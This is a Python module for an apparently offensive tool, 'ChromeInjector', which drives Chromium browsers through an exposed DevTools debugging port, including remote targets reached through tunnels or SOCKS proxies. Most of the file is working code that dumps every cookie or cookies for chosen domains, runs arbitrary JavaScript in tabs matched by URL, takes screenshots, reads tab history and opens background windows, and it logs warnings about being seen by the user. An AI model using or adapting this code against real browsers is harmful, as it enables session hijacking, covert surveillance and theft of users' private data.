"""This module contains the ChromeInjector Class
and the InjectorCommands class. The ChromeInjector class
is meant to be used to interact with (non-)headless
chromium browser instances. You can use it to execute arbitrary
Chrome Dev Protocol (CDP) commands or use some of the
pre-written commands already built in. E.g. get_open_tab_cookies()
to get cookies from all open tabs that match the url regex

You use ChromeInjector by instantiating a ChromeInjector object
with a host, and a target port.
Then call the instance methods.
"""
import sys
import os
import re
import asyncio
import ssl
import websockets
import requests
import socks
import socket
from contextlib import asynccontextmanager
import json
from string import Template
import logging
from .injectorcommands.injectorcommands import InjectorCommands
assert sys.version_info >= (3, 11)


class ChromeInjector:
    """A class used to create ChromeInjector objects,
    which interact with chromium browsers
    via the Chrome Dev Protocol
    """

    # Default timeout period in seconds
    DEFAULT_TIME = 30.0
    # Default sleep between requests period in seconds
    DEFAULT_SLEEP_TIME = 0.0
    # Default max size of ws response
    # Currently not using this
    DEFAULT_MAX_RESPONSE_SIZE = 256

    def __init__ (self, host: str = "127.0.0.1",
                    port: int = 9222,
                    rewrite_host_header: bool = False,
                    custom_host_header: str = "localhost",
                    custom_ws_target: str = None,
                    custom_ws_port: int = None,
                    wss: bool = False,
                    https: bool = False,
                    window_enum_ws: bool = False,
                    browser_ws: str = None,
                    safe_ssl: bool = False,
                    proxy_type: str = None,
                    proxy_host: str = None,
                    proxy_port: str = None) -> None:
        """New ChromeInjector

        Keyword arguments:
        host -- the target IP address (default 127.0.0.1)
        port -- the target CDP port (default 9222)
        rewrite_host_header -- change HOST header to custom_host_header (default False)
        custom_host_header -- custom HOST header (default localhost)
        custom_ws_target -- custom target host (e.g. ngrok host) (default None)
        custom_ws_port -- custom target port (e.g. ngrok port) (default None)
        wss -- use TLS/SSL for websocket connections (default False)
        https -- use https instead of http (default False)
        browser_ws -- Browser's debug WebSocket debug URL. Set to use ws for page enum instead of http (default None)
        safe_ssl -- Validate TLS/SSL certificates (default False)
        proxy_type -- custom proxy_type (http, socks4, socks5) (default None)
        proxy_host -- proxy host (default None)
        proxy_port -- proxy port (default None)
        """
        self._host = host
        self._port = port
        self._default_time = self.DEFAULT_TIME
        self._default_sleep_time = self.DEFAULT_SLEEP_TIME
        self._default_max_response_size = self.DEFAULT_MAX_RESPONSE_SIZE
        self._logger = logging.getLogger(__name__)
        # Windows are dicts including 'devtoolsFrontendURL, 'url',
        # and others as keys
        self._open_windows = None
        # ID incrementor
        self._id = 0
        # HOST Header Rewrites
        self._rewrite_host_header = rewrite_host_header
        self._custom_host_header = custom_host_header
        # Set custom_ws_target and custom_ws_port
        # to use custom target host:port (e.g. ngrok host:port)
        # instead of 127.0.0.1 or localhost for websocket requests
        self._custom_ws_target = custom_ws_target;
        self._custom_ws_port = custom_ws_port;
        # https and wss settings for TLS/SSL
        self._https = https
        self._wss = wss
        # If you want to do everything over websockets
        # and you know browser's WS debug URL
        self._browser_ws = browser_ws
        # Use safe TLS/SSL
        self._safe_ssl = safe_ssl
        # Set Proxy options
        self._proxy_type = proxy_type
        self._proxy_host = proxy_host
        self._proxy_port = proxy_port

        self._logger.info("Created new ChromeInjector")
        self._logger.debug(f"Created new ChromeInjector with host: {host} and port: {port}")
        if (
            not (("localhost" in self._host) or
            ("127.0.0.1" in self._host))
            and not custom_ws_target):
            self._logger.warning(f"Custom WS Target not set," +
                                    "but not using localhost or 127.0.0.1 as target")
        if custom_ws_target and not custom_ws_port:
            self._logger.warning("Custom target set but not custom port")

        if https and wss:
            self._logger.info("Using TLS/SSL for HTTP and WebSockets")
        elif https and not wss:
            self._logger.warning("Using TLS/SSL for HTTP but NOT WebSockets")
        elif (not https) and wss:
            self._logger.warning("Using TLS/SSL for WebSockets but NOT HTTP")

        if not self._safe_ssl and (https or wss):
            self._logger.warning("Not validating TLS/SSL certificates")

        if self._proxy_type and self._proxy_port and self._proxy_host:
            self._logger.info(f"Using {self._proxy_type} proxy at {self._proxy_host}:{self._proxy_port}")


    def get_browser_ws(self) -> str:
        """Returns browser debug ws url"""
        if not self._browser_ws:
            self._logger.warning("browser_ws not set, returning None")
            return None
        else:
            return self._browser_ws

    def set_browser_ws(self, browser_ws: str = None) -> None:
        """(Retrieves and) sets browsers debug ws url (self._browser_ws)
        
        Keyword arguments:
        browser_ws -- browser debug ws url (default: None)
        """
        if browser_ws:
            self._logger.info('Setting browser_ws')
            self._logger.debug(f'Setting browser_ws to: {browser_ws}')
            self._browser_ws = browser_ws
            return
        url = "http://"+self._host+":"+str(self._port)+"/json/version"
        if self._https:
            old_http_url = url
            url = re.sub('^http://','https://',old_http_url)
            self._logger.info('Changed url to https')
            self._logger.debug(f'Changed url {old_http_url} to {url}')
        
        response = None
        if self._rewrite_host_header:
            self._logger.info("rewriting host header")
            headers=f"'host':'{self._custom_host_header}'"
        else:
            headers = None

        if self._proxy_type:
            self._logger.info(f"Requesting ws URL with HTTP(S) through {self._proxy_type} proxy")
            proxies=dict(http=f'{self._proxy_type}://@{self._proxy_host}:{self._proxy_port}',
                         https=f'{self._proxy_type}://@{self._proxy_host}:{self._proxy_port}')
        else:
            proxies=None
        
        response = requests.get(url, headers=headers, proxies=proxies)
        if response and response.ok:
            self._logger.info("Successfully connected")
            self._logger.debug(f"Successfully connected to {url}")
            self._browser_ws = response.json().get('webSocketDebuggerUrl')
            self._logger.info(f"Browser WS: {self._browser_ws}")
        else:
            raise RuntimeError("Did not retrieve browser WS")
            

    def _enum_windows(self) -> None:
        """Set instance open windows."""
        # Construct url to query CDP browser WS
        # which will be used to enum windows
        self._logger.info("Attempting to enumerate open windows")
        try:
            if not self._browser_ws:
                self._logger.info('No browser_ws set, ' +
                                    'using http(s) to enum browser ws')
                self.set_browser_ws()

            # Attempt to enumerate open windows
            # If we got a response and the response is OK,
            # Go get windows over websocket
            self._logger.info("Attempting to enumerate open windows")
            target_infos_dict = self._exec_cdp_params(self._browser_ws,
                                                        'Target.getTargets',
                                                        None, None)
            target_infos = target_infos_dict['targetInfos']
            self._logger.info('Acquired targets')
            self._logger.debug(f"Target Infos: {target_infos}")
            self._open_windows = target_infos
            self._logger.info(f"{len(self._open_windows)} potential target(s)")
        except Exception as e:
            self._logger.error(f"Windows not enumerated: {e}")

    def _enum_targets(self, regex: re.Pattern) -> list[dict]:
        """Return target windows, based on regex, from open windows.
        
        Keyword arguments:
        regex -- compiled regex to filter URLs
        """
        if regex is None:
            self._logger.warning(f"No regex set for _enum_targets")
        target_windows = []
        if self._open_windows is None:
            self._logger.error(f"No open windows enumerated. No targets to enum")
            return
        # Iterate over open windows to create targets list based on regex
        window_count = 0
        for window in self._open_windows:
            window_type = window.get("type")
            # we only care about pages
            if window_type != "page":
                continue
            # we only care about pages that match search regex
            window_url = window.get("url")
            if not regex.search(window_url):
                continue
            # We have now found a 'window' with url matching search regex
            self._logger.info("Found tab matching regex")
            self._logger.debug(f"Found tab with url: {window_url}")
            target_windows.append(window)
            window_count += 1
        self._logger.info(f"There are {window_count} open window(s) that match target regex")
        return target_windows

    def _get_url_ws_url (self, window: dict) -> tuple[str, str]:
        """Return tuple of url and websocket url for a given window

        Keyword arguments:
        window -- dict of windows
        """
        url = window.get("url")
        ws_url = self.generate_ws_url(window.get('targetId'))
        return url, ws_url

    def _get_result(self, response: dict) -> dict:
        """Return result of a CDP websocket response

        Keyword arguments:
        response -- dict to process and extract results from
        """
        if response:
            try:
                result = response.get("result")
                if result:
                    return result
                elif len(result) == 0:
                    self._logger.info("Response of size zero")
                    return None
                else:
                    self._logger.warning(f"Failed to retrieve result from response: {response}")
                    return None
            except Exception as e:
                self._logger.warning(f"Failed to retrieve result from response: {e}")
                return None
        else:
            self._logger.warning("Response was None")
            return None

    async def _ws_send_wss(self, ws_url: str,
                           cdp_method: str,
                           cdp_params: dict,
                           ws: str) -> dict:
        """Execute CDP method and return dictionary of response

        Keyword arguments:
        cdp_method -- CDP method to use
        cdp_params -- dict of required and optional CDP params
        ws -- websocket URL"""
        try:
            # Execute with parameters
            if cdp_params:
                if type(cdp_params) is not dict:
                    self._logger.error(f"cdp_params is not a dict. Returning None")
                    return None
                template, *__ = InjectorCommands.get_command_template("cdp_exec_params")
                cdp_arb = template.substitute(id=self._id, method=cdp_method, params=json.dumps(cdp_params))
                self._id += 1
            # Execute without parameters
            else:
                template, *__ = InjectorCommands.get_command_template("cdp_exec")
                cdp_arb = template.substitute(id=self._id, method=cdp_method)
                self._id += 1
            self._logger.info(f"Sending WS Request with ID: {str(self._id-1)}")
            self._logger.debug(f"Sending:\n{cdp_arb}")            
            await ws.send(cdp_arb)
            msg = await ws.recv()
            self._logger.info(f"WS Response received for request ID: {str(self._id-1)}")
            self._logger.debug(f"WS Response:\n{msg}")
            # Convert to dictionary and return
            json_msg = json.loads(msg)
            self._logger.debug(f"Initiating websocket close")
            await ws.close()
            return json_msg
        except websockets.ConnectionClosed as cc:
            self._logger.error(f"Connection unexpectedly closed: {cc}")

    @asynccontextmanager
    async def _use_socks5_proxy(self, host: str, port: int):
        """asynccontextmanager for making ws request over SOCKS5

        Keyword arguments:
        host -- target host for proxy
        port -- target port for socks
        """
        # Store the original socket method
        original_socket = socket.socket
        
        # Set up SOCKS proxy
        # Should eventually lookup SOCKS5 (2) and set dynamically
        self._logger.info(f"Setting socket to use {self._proxy_type} proxy ({self._proxy_host}:{self._proxy_port})")
        socks.set_default_proxy(socks.SOCKS5, host, port)
        socket.socket = socks.socksocket
        
        try:
            yield
        finally:
            # Restore the original socket method after exiting the context
            socket.socket = original_socket
            self._logger.info("Reset to original socket")

    async def _cdp_ws_arb(self, ws_url: str,
                          cdp_method: str,
                          cdp_params: dict = None) -> dict:
        """Wrapper for _ws_send_wss based on self._wss (TLS/SSL)

        Keyword arguments:
        ws_url -- websocket URL
        cdp_method -- CDP method to use
        cdp_params -- dict of required and optional CDP params (default: None)
        """
        # Overwrite ws_url with custom_ws_target
        if self._custom_ws_target and (self._custom_ws_target not in ws_url):
            self._logger.info('Using custom WS')
            self._logger.debug(f'Custom ws:{self._custom_ws_target}')
            old_ws_url = ws_url
            ws_url = re.sub('^ws://(localhost|127.0.0.1)(:[0-9]{1,}){0,}/',
                            f'ws://{self._custom_ws_target}:{self._custom_ws_port}/',
                            old_ws_url)
            self._logger.info('Changed WS to custom WS target')
            self._logger.debug(f'Changed ws_url ({old_ws_url}) to '+
                                f'custom_ws_target ({ws_url})')

        # Connect to websocket and execute CDP method
        # based on TLS/SSL or not
        if self._wss:
            old_ws_url = ws_url
            if 'wss' not in old_ws_url:
                ws_url = re.sub('^ws://', f'wss://', old_ws_url)
                self._logger.info('Changed WS URL')
                self._logger.debug(f'Changed {old_ws_url} to {ws_url}')
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if not self._safe_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
        else:
            ssl_context = None
        if self._proxy_type:
            if self._proxy_type.upper() == 'SOCKS5':
                self._logger.info(f"Making ws request through SOCKS5 proxy ({self._proxy_host}:{self._proxy_port})")
                async with self._use_socks5_proxy(self._proxy_host, self._proxy_port):
                    async for ws in websockets.connect(ws_url, ssl=ssl_context):
                        return await self._ws_send_wss(ws_url, cdp_method, cdp_params, ws)
            #elif socks4
            #elif http  
            #elif wrong socks
            else:
                self._logger.info(f"Proxy type: '{self._proxy_type}' not supported. Try socks5")
        else:
            self._logger.debug("Proxy type not set, not using proxy")
            async for ws in websockets.connect(ws_url, ssl=ssl_context):
                    return await self._ws_send_wss(ws_url, cdp_method, cdp_params, ws)
            
        

    async def _cdp_ws_arb_timeout(self, ws_url: str,
                                  cdp_method: str,
                                  cdp_params: str = None,
                                  time: int = None) -> dict:
        """Wrapper function for _cdp_ws_arb to add timeout

        Keyword arguments:
        ws_url --: websocket URL
        cdp_method -- CDP method to use
        cdp_params -- dict of required and optional CDP params (default: None)
        time -- timeout in seconds (default: None)
        """
        self._logger.info('Method with(out) parameter(s) constructed')
        self._logger.debug(f'ws_url: {ws_url}, cdp_method: {cdp_method}, ' +
                           f'cdp_params: {bool(cdp_params)}, timeout: {time}')
        if not time:
            time = self._default_time
        try:
            async_resp = await asyncio.wait_for(self._cdp_ws_arb(ws_url, cdp_method, cdp_params), timeout=time)
            return async_resp

        except asyncio.TimeoutError:
            self._logger.error(f"Timeout occured against {ws_url}")
            return None
        except Exception as e:
            self._logger.error(f"Error occured: {e}")
            return None

    async def _sleep_await(self, time:int = None) -> None:
        """Helper function to sleep execution on given CI:

        Keyword arguments:
        time -- timeout in seconds (default: None)
        """
        if not time:
            time = self._default_sleep_time
        self._logger.info('Sleeping')
        self._logger.debug(f"Sleeping for {time} sec(s)")
        await asyncio.sleep(time)

    async def _sleep(self, time: int = None) -> None:
        """Wrapper function to sleep execution on given CI

        Keyword arguments:
        time -- timeout in seconds (default: None)
        """
        await self._sleep_await(time=time)

    def _exec_cdp_params(self, ws_url: str,
                        cdp_method: str,
                        cdp_params: dict,
                        time: int) -> dict:
        """Return result of executing correct _cdp_ws_arb_timeout
        based on cdp_params or not

        Keyword arguments:
        ws_url -- websocket URL
        cdp_method -- CDP method to use
        cdp_params -- dict of required and optional CDP params
        time -- timeout in seconds
        """
        if cdp_params:
            if type(cdp_params) is not dict:
                self._logger.error(f"cdp_params is not a dict. Returning None")
                return None
            self._logger.info('Executing')
            self._logger.debug(f"Executing with parameters: {cdp_params}")
            ws_response = asyncio.run(self._cdp_ws_arb_timeout(ws_url, cdp_method, cdp_params, time=time))
        else:
            self._logger.info("No cdp_params. Running without arguments")
            ws_response = asyncio.run(self._cdp_ws_arb_timeout(ws_url, cdp_method,time=time))

        result = self._get_result(ws_response)
        result_size = sys.getsizeof(result)
        self._logger.info(f"Response size of {result_size} bytes")
        if result_size > 1024:
            self._logger.warning("Response greater than 1mb")
        return result

    def generate_ws_url(self, targetID: str) -> str:
        """Generate wss:// or ws:// url badsed on _wss

        Keyword arguments:
        targetID -- CDP ID for target tab, etc
        """
        ws_url = (("wss://" if self._wss else "ws://") +
                  f"{self._host}:" +
                  f"{self._port}/devtools/page/" +
                  targetID)
        return ws_url

    def get_current_tab(self) -> dict:
        """Return dict of current tab"""
        self._logger.info("Attempting to identify current tab")
        current_tab = None
        self._enum_windows()
        open_windows = self._open_windows
        self._logger.debug(f"Open windows:\n{open_windows}")
        if open_windows:
            self._logger.info("Executing JS on potentially every open page to " +
                              "enumerate focused tab/window")
            for tab in open_windows:
                tab_url, tab_ws_url = self._get_url_ws_url(tab)
                self._logger.debug(f"Tab ws: {tab_ws_url}")
                if tab['type'] == 'page':
                    result = self._exec_cdp_params(tab_ws_url, "Runtime.evaluate",
                                                  {'expression':'document.visibilityState'}, None)
                    self._logger.debug(f"Result is: {result}")
                    if result['result']['value'] == 'visible':
                        self._logger.info("Found focused tab")
                        current_tab = tab
                        break
                else:
                    self._logger.error(f"Skipping tab ws: {tab_ws_url}, of type: {tab['type']}")
            if current_tab is None:
                self._logger.warning('Active tab not identified. Returning None')
                return current_tab
        else:
            self._logger.warning('No open tabs. Returning None')
            return current_tab
        self._logger.info("ID'd current tab")
        self._logger.debug(f"Current tab is: {current_tab}")
        return current_tab

    def switch_tabs(self, ws_url: str,
                    time: int = None) -> None:
        """Switch to target ws_url tab into focus

        Keyword arguments:
        ws_url -- websocket URL
        time -- timeout in seconds (default: None)"""
        self._exec_cdp_params(ws_url, "Page.bringToFront", None, time)
        self._logger.info(f"Switched to target tab {ws_url}")

    def get_windows_list(self) -> dict:
        """Return list of open windows."""
        self._enum_windows()
        return self._open_windows

    def get_target_windows(self, regex: re.Pattern) -> dict:
        """Return list of target windows.

        Keyword Arguments:
        regex: Compiled regex pattern for target URLs
        """
        target_windows = self._enum_targets(regex)
        return target_windows

    def get_host(self) -> None:
        """Return target host as string"""
        return self._host

    def get_port(self) -> int:
        """Return target port as number"""
        return self._port

    def get_default_timeout(self) ->  int:
        """Return default timout value"""
        return self._default_time

    def set_default_timeout(self, new_value: int) -> None:
        """Set default timeout value

        Keyword arguments:
        new_value -- new timeout value"""
        if type(new_value) is not int:
            self._logger.error("New default value must be an integer")
            return
        self._default_time = new_value

    def get_default_sleep_time(self) -> int:
        """Return default sleep value"""
        return self._default_sleep_time

    def set_default_sleep_time(self, new_value: int) -> None:
        """Set default timeout value

        Keyword arguments:
        new_value -- new default sleep time"""
        if type(new_value) is not int:
            self._logger.error("New default value must be an integer")
            return
        self._default_sleep_time = new_value

    def get_default_max_response_size(self) -> int:
        """Return default max response size in mb"""
        return self._default_max_response_size

    def set_default_max_response_size(self, new_value: int) -> None:
        """Set default max response size in mb

        Keyword arguments:
        new_value -- new max response size value"""
        if type(new_value) is not int:
            self._logger.error("New default value must be an integer")
            return
        self._default_max_response_size = new_value

    def cdp_method_exec(self, cdp_method: str,
                        cdp_params: dict = None,
                        regex: re.Pattern = None,
                        first_window: bool = False,
                        first_target: bool = False,
                        time: int = None,
                        ws_url: str = None,
                        associate_ws_url: bool = False,
                        tab_focus: bool = False,
                        tab_focus_back: bool = True,
                        enum_windows: bool = True,
                        browser_debug_ws: bool|str = False) -> (str, list, str) :
        """Execute CDP method and return list of thruples of (url, result, ws_url).

        Keyword arguments:
        cdp_params -- json dict e.g. {"expression":"alert(1);"} (default None)
        regex -- regex to create targets list form open windows (default '.*')
        first_window -- flag to only execute on first tab in window dict (default False)
        first_target -- flag to only execute on first target tab (default False)
        time -- timeout for execution (default DEFAULT_TIME)
        ws_url -- ws_url of known target, cannot be used with regex (default None)
        associate_ws_url -- perform extra enumeration of open tabs to associate ws_url with original tab (default False)
        tab_focus -- flag to put tab in focus before executing CDP method (default False)
        tab_focus_back -- flag to return focus back to original tab after focus switch (default True)
        enum_windows -- flag to (re-)enumerate windows or not (default True)
        browser_debug_ws -- flag or string of browser debug WS (default False)
        """
        url_result_ws_url = []
        target_windows = []
        original_tab_ws_url = None
        switch_occured = False
        # Use Browser debug url, either self enumerated or provided
        # as argument and containing 'devtools/browser' in URL
        if browser_debug_ws and (ws_url or regex or
                                 first_window or first_target or
                                 tab_focus):
            self._logger.error("Cannot use browser_debug_ws and " +
                               "(ws_url|regex|first_window|first_target|tab_focus) together")
            return None
        elif (type(browser_debug_ws) is bool) and browser_debug_ws:
            self._logger.info("Executing against browser debug WS")
            if self._browser_ws:
                ws_url = self._browser_ws
            else:
                self._logger.warning("Browser Debug WS not set, attempting" +
                                     " to enumerate")
                self.set_browser_ws()
                if self._browser_ws:
                    ws_url = self._browser_ws
                else:
                    self._logger.error("Could not enumerate browser WS")
                    return None
        elif (type(browser_debug_ws) is str):
            if "devtools/browser" not in browser_debug_ws:
                self._logger.error("browser_debug_ws is not a browser debug WS")
                return None
            else:
                self._logger.info("Using provided browser debug WS")
                self._logger.debug(f"Provided browser debug WS: {browser_debug_ws}")
                ws_url = browser_debug_ws
        if not time:
            time = self._default_time
        # Either need to iterate over all target windows (after enum)
        # or use explicit ws_url, not both
        if (first_target or first_window or regex) and ws_url:
            self._logger.error("Cannot use (first_target|first_window|regex) and ws_url together")
            return None
        if tab_focus and tab_focus_back:
            self._logger.warning("tab_focus and tab_focus_back are set to True. "+\
                                "Will switch focus back to original tab after CDP execution(s)")
            original_tab=self.get_current_tab()
            original_url, original_tab_ws_url = self._get_url_ws_url(original_tab)
        elif tab_focus:
            self._logger.warning("tab_focus set to True. "+\
                                "Will focus target tab for each CDP execution")
        # If we provide ws_url send command straight there
        # No enumeration
        if ws_url:
            self._logger.info("Executing against explicit ws_url")
            if tab_focus:
                self.switch_tabs(ws_url)
                switch_occured = True
            result = self._exec_cdp_params(ws_url, cdp_method, cdp_params, time)
            # Should probably get url to print
            url = ws_url
            if (associate_ws_url):
                self._enum_windows()
                open_windows = self._open_windows
                # Set url to actual url if ws_url is associated with an open window
                # Else just use ws_url as url value
                if open_windows:
                    self._logger.info(f"Looking for original tab to associate with ws_url: {ws_url}")
                    for tab in open_windows:
                        tab_url, tab_ws_url = self._get_url_ws_url(tab)
                        #self._logger.debug(f"tab_url:{tab_url} tab_ws_url:{tab_ws_url}")
                        if ws_url == tab_ws_url:
                            self._logger.info("Found URL for ws_url")
                            url = tab_url
                            break
            url_result_ws_url.append((url, result, ws_url))
        # Else we need to pick targets using regex for URL
        # Requires enumeration of tabs
        else:
            if not (type(regex) is re.Pattern or regex is None):
                self._logger.error(f"regex must be of type re.Pattern or None not {type(regex)}")
                return None
            if enum_windows:
                self._logger.info("enum_windows is True: Enumerating open tabs")
                self._enum_windows()
            if not regex:
                regex = re.compile('.*')
                self._logger.warning("regex set to '.*'")
            # If we only want to to execute on the first tab
            # set target tabs just to the first tab of _open_windows regardless of targets
            # E.g. if we're getting all cookies
            if first_window and self._open_windows:
                window = self._open_windows[0]
                target_windows.append(window)
            elif not self._open_windows:
                self._logger.error("No open windows. Returning None")
                return None
            else:
                # Enumerate targets now
                self._logger.info("Enum'ing targets from open windows")
                final_targets = self._enum_targets(regex)
                # If we only want to execute against first target
                if first_target and final_targets:
                    target_windows.append(final_targets[0])
                elif final_targets:
                    target_windows = final_targets
                else:
                    self._logger.error("No target windows. Returning None")
                    return None

            # Iterate over target windows and perform the CDP method
            windows_left = len(target_windows)
            for window in target_windows:
                windows_left -= 1
                url, ws_url = self._get_url_ws_url(window)
                self._logger.info(f"Executing '{cdp_method}' against '{url}', {ws_url}")
                if tab_focus:
                   self.switch_tabs(ws_url)
                   switch_occured = True
                result = self._exec_cdp_params(ws_url, cdp_method, cdp_params, time)
                url_result_ws_url.append((url, result, ws_url))
                if windows_left > 0:
                    asyncio.run(self._sleep())

        if switch_occured and tab_focus_back:
            self._logger.info("Switching back to original tab")
            self.switch_tabs(original_tab_ws_url)
        return url_result_ws_url

    def cdp_eval_script(self, script: str,
                        regex: re.Pattern = None,
                        first_target: bool = False,
                        time: int = None,
                        ws_url: str = None,
                        returnBV: bool = False,
                        silent: bool = False) -> tuple[str, dict, str]:
        """Evaluate script on each target tab and 
        return array of thruple of url, result, and ws_url.

        Keyword arguments:
        regex -- Compiled regex to enumerate targets based on URL (default: None)
        first_target -- flag to only execute on first target (default: False)
        time -- timeout in seconds (default: None)
        ws_url -- websocket URL (default: None)
        returnBV -- Whether the result is expected to be a JSON object
                    that should be sent by value. (default: False)
        silent -- In silent mode exceptions thrown during evaluation
                are not reported and do not pause execution.
                Overrides setPauseOnException state. (default: False)
        """
        url_result_ws_url = []
        if not script:
            self._logger.error("Script not set")
            return url_result_ws_url
        command, *__ = InjectorCommands.get_command("js_exec")
        arguments = {"expression": script, "returnByValue": returnBV, "silent": silent}
        url_result_ws_url = self.cdp_method_exec(command, arguments, regex, first_target=first_target, time=time, ws_url=ws_url)
        return url_result_ws_url

    def cdp_get_open_tab_cookies(self, regex: re.Pattern = None,
                                first_target: bool = False,
                                time: int = None,
                                ws_url: str = None) -> list[tuple[str,dict,str]]:
        """Return list of thruples of [(url, cookies, ws_url)].

        Keyword arguments:
        regex -- Compiled regex to enumerate targets based on URL (default: None)
        first_target -- flag to only execute on first target (default: False)
        time -- timeout in seconds (default: None)
        ws_url -- websocket URL (default: None)
        """
        list_url_cookies_ws_url = []
        command, *__ = InjectorCommands.get_command("tab_cookies")
        results = self.cdp_method_exec(command, None, regex,
                                       first_target=first_target,
                                       time=time, ws_url=ws_url)
        # Return None if results are None
        if not results:
            return None
        for url, result, tab_ws_url in results:
            if not result:
                cookies = None
                self._logger.error(f"'{url}' result was None")
            else:
                cookies = result.get("cookies")
            list_url_cookies_ws_url.append((url, cookies, tab_ws_url))
        return list_url_cookies_ws_url

    def cdp_get_all_cookies(self, time:  int = None) -> dict:
        """Return all cookies as dict:

        Keyword arguments:
        time -- timeout in seconds
        """
        command, *__ = InjectorCommands.get_command("all_cookies")
        results = self.cdp_method_exec(command,browser_debug_ws=True, time=time)
        if not results:
            self._logger.error("No cookies, returning None")
            return None
        url, result, tab_ws_url = results[0]
        return result.get("cookies")

    def cdp_get_domain_cookies(self, params: dict,
                               time: int = None) -> dict:
        """Return cookies for specified
        dict ("urls":[list of domains]) parameter

        Keyword arguments:
        params -- dict with {"url":"http(s)://target.pwn"}
        time -- timeout in seconds (default: None)
        """
        if params is None:
            self._logger.error("No domain specified")
            return None
        command, *__ = InjectorCommands.get_command("get_domain_cookies")
        validated_params = InjectorCommands.create_validated_params("get_domain_cookies", params)
        if validated_params:
            results = self.cdp_method_exec(command, validated_params, first_window=True, time=time)
        else:
            self._logger.error("Incorrect parameters provided. Returning None")
            return None
        url, result, tab_ws_url = results[0]
        if result:
            return result.get("cookies")
        else:
            return None

    def cdp_capture_screenshot(self, regex: re.Pattern = None,
                               first_target: bool = False,
                               time: int = None,
                               ws_url: int = None,
                               quality: int = None,
                               tab_focus_back: bool = False) -> list[tuple[str, str, str]]:
        """Return list of thruples of (url, base64, ws_url) encoded PNG

        Keyword arguments:
        regex -- compiled regex to enumerate targets based on URL (default: None)
        first_target -- flag to only execute on first target (default: False)
        time -- timeout in seconds (default: None)
        tab_focus -- flag to specify if 
        ws_url -- websocket URL (default: None)
        quality -- 0 - 100 quality (default: None)
        tab_focus_back -- flag to return focus back to original tab after focus switch (default False)
        """
        url_screenshot_ws_url = []
        command, *__ = InjectorCommands.get_command("capture_screenshot")
        if quality:
            self._logger.info(f"Sending screenshot request with quality of {quality}")
            if type(quality) is not int or not (quality >= 0 and quality <= 100):
                self._logger.error("quality must be an int >=0 and <=100")
                return None
            params = {"format":"jpeg","quality":quality}
            results = self.cdp_method_exec(command, cdp_params=params, regex=regex, first_target=first_target,
                                          time=time, tab_focus=True, ws_url=ws_url,
                                          tab_focus_back=tab_focus_back)
        else:
            results = self.cdp_method_exec(command, cdp_params=None, regex=regex, first_target=first_target,
                                          time=time, tab_focus=True, ws_url=ws_url,
                                          tab_focus_back=tab_focus_back)
        if not results:
            return None
        for url, result, tab_ws_url in results:
            if not result:
                data = None
                self._logger.error(f"'{url}' result was None")
            else:
                data = result.get("data")
            url_screenshot_ws_url.append((url, data, tab_ws_url))
        return url_screenshot_ws_url

    def cdp_get_open_tabs(self) -> dict:
        """Return list of tab dicts"""
        self._logger.info("Enumerating open tabs")
        self._enum_windows()
        return self._open_windows

    def cdp_new_window(self, url: str,
                       background: bool = False,
                       new_window: bool = False,
                       for_tab: bool = False) -> (str, str):
        """Return tuple of ws_url and targetID if opening new window/tab is successful

        Keyword arguments:
        url -- new target window url, include http(s)://
        background -- flag to background new window (default: False)
        new_window -- flag to open new tab in new window (default: False)
        for_tab -- flag to create the target of type "tab", EXPERIMENTAL (default: False)
        """
        if background and new_window:
            self._logger.warning("Using background and new_window together " +
                          "may not work as expected. May pop up new " +
                          "window in view of user")
        self._logger.info(f"Opening new {'window' if new_window else 'tab'}")
        if for_tab:
            # Warning for Chrome Versions 120.0.6099.218+
            self._logger.warning("As of Chrome 120.0.6099.218 "+
                                 "Target.createTarget with forTab "+
                                 "returns incorrect "+
                                 "target ID. Check with cdp_get_open_tabs")
        command, *__ = InjectorCommands.get_command("new_window")
        if not url:
            url = 'chrome://newtab'
        params = {"url":url, "background":background,
                  "newWindow":new_window, "forTab": for_tab}
        validated_params = InjectorCommands.create_validated_params("new_window", params)
        if validated_params:
            result = self.cdp_method_exec(command, validated_params, browser_debug_ws=True)
        else:
            self._logger.error("Incorrect parameters provided. Returning None")
            return None
        targetID = result[0][1].get("targetId")
        ws_url = self.generate_ws_url(targetID)
        return ws_url, targetID

    def cdp_close_window(self, targetID: str) -> bool:
        """Return True if tab succesfully closed"""
        command, *__ = InjectorCommands.get_command("close_window")
        params = {"targetId":targetID}
        validated_params = InjectorCommands.create_validated_params("close_window", params)
        if validated_params:
            result = self.cdp_method_exec(command, validated_params, browser_debug_ws=True)
        else:
            self._logger.error("Incorrect parameters provided. Returning None")
            return False
        return_bool = True if result[0][1] is not None else False
        return return_bool

    def cdp_get_tab_history(self, regex: re.Pattern = None,
                            first_target: bool =  False,
                            time: int = None,
                            ws_url: str = None) -> list[tuple[str,dict,str]]:
        """Return list of tab history per tab

        Keyword arguments:
        regex -- compiled regex to create targets list
        first_target -- flag to only execute on first target tab (default False)
        time -- timeout for execution (default None)
        ws_url -- ws_url of known target, cannot be used with regex (default None)
        """

        url_history_ws_url = []
        command, *__ = InjectorCommands.get_command("get_tab_history")
        results = self.cdp_method_exec(command,cdp_params=None, regex=regex, first_target=first_target,
                                        time=time, ws_url=ws_url)
        if not results:
            return None
        for url, result, tab_ws_url in results:
            if not result:
                data = None
                self._logger.error(f"'{url}' result was None")
            else:
                data = result.get("entries")
            url_history_ws_url.append((url, data, tab_ws_url))
        return url_history_ws_url

